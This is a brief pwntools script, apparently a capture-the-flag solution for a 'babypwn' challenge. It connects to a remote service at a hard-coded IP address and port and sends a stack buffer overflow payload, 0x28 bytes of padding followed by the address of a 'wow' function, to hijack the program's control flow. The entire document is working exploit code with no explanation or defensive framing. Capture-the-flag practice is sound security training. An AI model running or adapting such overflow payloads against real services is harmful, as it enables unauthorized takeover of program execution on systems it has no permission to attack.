from pwn import *

p = ELF("./babypwn")
r = remote("194.5.207.56",7010)

offset = 0x28
payload = b"A"*offset
payload += p64(p.symbols['wow'])

r.recv()
r.sendline(payload)
print(r.recvall())